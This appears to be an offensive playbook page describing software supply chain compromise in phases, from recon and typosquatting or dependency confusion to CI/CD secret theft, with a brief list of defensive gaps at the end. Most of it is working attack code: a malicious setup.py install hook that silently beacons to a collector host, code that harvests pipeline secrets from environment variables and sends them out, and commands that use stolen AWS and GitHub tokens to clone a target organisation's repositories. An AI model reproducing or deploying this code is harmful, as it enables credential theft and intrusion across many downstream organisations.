# Supply chain compromise

Infecting a software ecosystem or CI/CD pipeline to propagate collection
capability to multiple organisations from a single point of compromise.

## Scope and prerequisites

- Target: one or more organisations that consume a common software component
- Entry point: a package registry account, a developer account, or a
  CI/CD platform credential
- Success criteria: collect build secrets and credentials from consuming
  organisations; optionally propagate further into their production environments

## Phase 1: recon

Identify weak links in the target's software supply chain.

```bash
# identify dependencies from public package manifests
# package.json (npm), requirements.txt (pip), go.mod (Go), Gemfile (Ruby)
# check GitHub: many organisations have public repos with these files

# check for unmaintained packages (last release 2+ years ago)
pip index versions PACKAGE_NAME  # PyPI
npm view PACKAGE_NAME time       # npm

# identify packages with weak maintainer account security
# (check haveibeenpwned.com for maintainer email addresses)

# check if the organisation uses a private package registry
# job postings, Dockerfile RUN commands, and CI config files often reveal this

# check GitHub Actions usage for mutable third-party action references
# (uses: org/action@main is mutable; uses: org/action@SHA is not)
grep -r 'uses:' .github/workflows/ | grep -v '@[a-f0-9]\{40\}'
```

## Phase 2: compromise the upstream component

### Option A: typosquatting

```bash
# register a package name that is a common typo of a popular package
# check availability first
pip index versions reqeusts  # does this exist? if not, register it

# create a package that runs collection code on install
mkdir reqeusts && cd reqeusts
cat > setup.py << 'EOF'
from setuptools import setup
from setuptools.command.install import install
import subprocess, os

class PostInstall(install):
    def run(self):
        install.run(self)
        # runs silently during pip install
        subprocess.Popen(['python3', '-c',
            'import os,socket,urllib.request; '
            'urllib.request.urlopen("https://collector.example.com/beacon?"'
            '+socket.getfqdn())'],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

setup(name='reqeusts', version='2.32.4',  # slightly higher than latest real version
      cmdclass={'install': PostInstall})
EOF
python3 -m build
twine upload dist/*
```

### Option B: dependency confusion

```bash
# if the organisation has a private package named 'internal-auth'
# and this name does not exist on the public PyPI:
# publish 'internal-auth' to PyPI with a version higher than the internal one
# pip will prefer the public version

# set version to 99.0.0 to guarantee it wins the version comparison
```

### Option C: developer account compromise

Gain access to a legitimate maintainer account via credential stuffing
or phishing, then push a malicious update to the existing package.

## Phase 3: lateral propagation via CI/CD

Once the malicious package is consumed by a CI/CD pipeline, inject additional
collection capability:

```
# malicious code in setup.py runs during 'pip install' in the pipeline
# at that point, pipeline environment variables (secrets) are accessible
import os, json, urllib.request

secrets = {k: v for k, v in os.environ.items()
           if any(t in k.upper() for t in
                  ['TOKEN', 'SECRET', 'KEY', 'PASSWORD', 'AWS', 'AZURE', 'GH_'])}
if secrets:
    urllib.request.urlopen(urllib.request.Request(
        'https://collector.example.com/pipeline',
        data=json.dumps({
            'host': os.getenv('GITHUB_REPOSITORY', os.uname().nodename),
            'runner': os.getenv('RUNNER_NAME', ''),
            'secrets': secrets
        }).encode(),
        headers={'Content-Type': 'application/json'}
    ))
```

## Phase 4: collection from consuming organisations

With pipeline secrets in hand, use them to access the consuming organisations'
cloud environments and code repositories:

```bash
# use collected AWS credentials
AWS_ACCESS_KEY_ID=HARVESTED AWS_SECRET_ACCESS_KEY=HARVESTED \
  aws sts get-caller-identity

# use collected GitHub token
curl -H "Authorization: token HARVESTED_TOKEN" \
  https://api.github.com/orgs/TARGET_ORG/repos?per_page=100 |
  python3 -c "import json,sys; [print(r['clone_url']) for r in json.load(sys.stdin)]" |
  while read url; do git clone "$url"; done
```

## Phase 5: exfiltration

Collected build secrets, repositories, and credential material are staged
and exfiltrated to attacker infrastructure. Priority targets:

- Cloud provider credentials (deploy and access production systems)
- Code signing certificates (sign malicious binaries)
- Infrastructure configuration (Terraform, CloudFormation)
- Database connection strings
- Private keys and certificates

## Defensive gaps this exposes

- Dependency verification: absence of hash pinning and signature verification
  in package manifests
- Registry permissions: pipeline credentials with overly broad scope
- Supply chain monitoring: no scanning of dependencies for malicious code
- Least privilege in pipelines: pipeline tokens with access beyond the
  scope of the specific job
- Third-party action pinning: use of mutable references in GitHub Actions
